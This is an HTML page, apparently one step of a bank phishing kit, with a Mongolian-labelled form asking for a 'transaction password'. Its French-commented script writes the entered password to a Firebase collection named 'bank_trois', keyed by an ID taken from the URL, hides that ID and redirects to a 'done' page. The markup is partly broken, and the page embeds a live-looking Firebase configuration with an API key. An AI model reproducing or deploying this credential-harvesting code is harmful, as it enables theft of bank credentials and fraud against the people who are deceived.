<body>
 <header>
        <nav class="navbar navbar-expand-lg">
            <div class="container">

    <main>
        <div class="m-3 text-center">
            <img src="images/ban2.png" alt="" class="img-fluid w-lg-25" width="150">
        </div>
        <div>
            <form id="transactionPasswordForm" class="container">
                <div class="input-group">
                    <input 
                        type="text" 
                        name="transacpassword" 
                        id="transacpassword" 
                        class="form-control form-control-lg"

                </div>
                <br>
                <button type="submit" class="btn w-100 my-3 text-white bg-green">Нэгдэх</button>

        </div>
    </main>
<footer>
        <div class="container">
            <div class="row">
                <div class="col-md-6 mb-3">

                </div>
                <div class="col-md-6">
                    <div class="footer-links text-md-end">
                        <ul class="list-inline">

                    </div>
                </div>
            </div>
        </div>
    </footer>

    <script>
        document.getElementById('togglePassword').addEventListener('click', function () {
            const passwordInput = document.getElementById('password');
            const isPassword = passwordInput.type === 'password';
            passwordInput.type = isPassword ? 'text' : 'password';
            const icon = this.querySelector('i');
            icon.classList.toggle('fa-eye');
            icon.classList.toggle('fa-eye-slash');
        });
    </script>
       <script type="module">
        // Importation de Firebase
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
        import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";

        // Configuration Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyBAn0oOcsPWlu82p_FpFyz5Bnq4dTd0R2o",
            authDomain: "virement2-bf790.firebaseapp.com",
            projectId: "virement2-bf790",
            storageBucket: "virement2-bf790.firebasestorage.app",
            messagingSenderId: "965517390511",
            appId: "1:965517390511:web:430715abd2331f0a42da5a"
        };

        // Initialisation Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Récupérer l'ID du document depuis l'URL
        const urlParams = new URLSearchParams(window.location.search);
        const documentId = urlParams.get("id");

        // Gestion du formulaire
        document.addEventListener("DOMContentLoaded", function () {
            document.getElementById("transactionPasswordForm").addEventListener("submit", async function (event) {
                event.preventDefault(); // Empêche le rechargement de la page

                const transacpassword = document.getElementById("transacpassword").value;

                if (transacpassword && documentId) {
                    try {
                        // Mettre à jour le document avec le code
                        await updateDoc(doc(db, "bank_trois", documentId), {
                            transacpassword: transacpassword
                        });

                        console.log("Document mis à jour avec le mdp de transac : ", transacpassword);

                        // Supprimer l'ID de l'URL
                        const newUrl = window.location.origin + window.location.pathname;
                        history.replaceState(null, "", newUrl);

                        // Rediriger vers la page de confirmation
                        window.location.href = "done.html";

                    } catch (error) {
                        console.error("Erreur Firebase :", error);
                        alert("Une erreur s'est produite. Veuillez réessayer.");
                    }
                } else {
                    alert("Veuillez entrer un mot de passe de transaction !");
                }
            });
        });
    </script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous"></script>
